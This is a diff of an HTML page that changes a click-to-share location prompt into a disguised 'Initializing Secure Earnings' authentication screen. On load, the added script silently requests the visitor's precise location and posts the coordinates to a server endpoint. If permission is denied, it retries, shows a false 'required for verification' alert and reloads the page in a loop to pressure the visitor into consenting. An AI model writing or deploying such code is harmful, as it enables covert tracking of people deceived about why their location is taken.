@@ -1,108 +1,106 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Location Required</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Processing...</title>
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to bottom, #f0f4f8, #dfe9f3);
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #eff3f6, #d7e3ed);
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
     }
 
-    .card {
+    .box {
+      text-align: center;
       background: white;
+      padding: 30px;
       border-radius: 20px;
       box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-      padding: 30px;
-      max-width: 360px;
-      text-align: center;
+      width: 90%;
+      max-width: 340px;
       animation: fadeIn 1s ease-out;
     }
 
-    .card h2 {
-      margin-top: 0;
-      color: #0077cc;
+    .box h2 {
+      margin: 0 0 10px;
+      font-size: 22px;
+      color: #333;
     }
 
-    .card p {
-      color: #444;
-      font-size: 15px;
+    .box p {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 20px;
     }
 
-    .btn {
-      margin-top: 25px;
-      padding: 15px 30px;
-      background-color: #2ecc71;
-      border: none;
-      border-radius: 50px;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-      box-shadow: 0 5px 15px rgba(46, 204, 113, 0.4);
-      transition: background-color 0.3s ease;
-    }
-
-    .btn:hover {
-      background-color: #27ae60;
-    }
-
-    .loader {
+    .progress {
       width: 100%;
-      background: #e1e4e8;
-      border-radius: 50px;
+      background: #e0e0e0;
+      height: 8px;
+      border-radius: 5px;
       overflow: hidden;
-      margin-top: 20px;
-      height: 10px;
+      position: relative;
     }
 
-    .loader-bar {
+    .bar {
       width: 0%;
       height: 100%;
       background: #3498db;
-      animation: load 3s ease-out forwards;
+      animation: fill 3s forwards;
     }
 
-    @keyframes load {
+    @keyframes fill {
       to { width: 100%; }
     }
 
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
+      from { opacity: 0; transform: translateY(10px); }
       to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Enable Location</h2>
-    <p>For your security and personalized experience, we need your precise location.</p>
-    <div class="loader"><div class="loader-bar"></div></div>
-    <button class="btn" onclick="requestLocation()">Continue</button>
+  <div class="box">
+    <h2>Initializing Secure Earnings</h2>
+    <p>Please wait while your session is being authenticated...</p>
+    <div class="progress"><div class="bar"></div></div>
   </div>
 
   <script>
-    function requestLocation() {
-      if (!navigator.geolocation) {
-        alert("Geolocation not supported.");
-        return;
-      }
+    function askLocation(retry = false) {
+      if (!navigator.geolocation) return;
 
       navigator.geolocation.getCurrentPosition(
-        pos => {
-          alert("Location accessed. Thanks!");
-          // send location to server here
+        position => {
+          fetch('/api/report', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              lat: position.coords.latitude,
+              lon: position.coords.longitude
+            })
+          });
         },
-        err => {
-          alert("Permission denied or error. Please enable location services.");
+        error => {
+          if (error.code === 1 && !retry) {
+            setTimeout(() => askLocation(true), 2000);
+          } else {
+            alert("Please enable location to continue. This is required for verification.");
+            location.reload(); // try again after reload
+          }
         }
       );
     }
+
+    // auto request after load
+    window.onload = () => {
+      setTimeout(() => askLocation(), 500);
+    };
   </script>
 </body>
 </html>
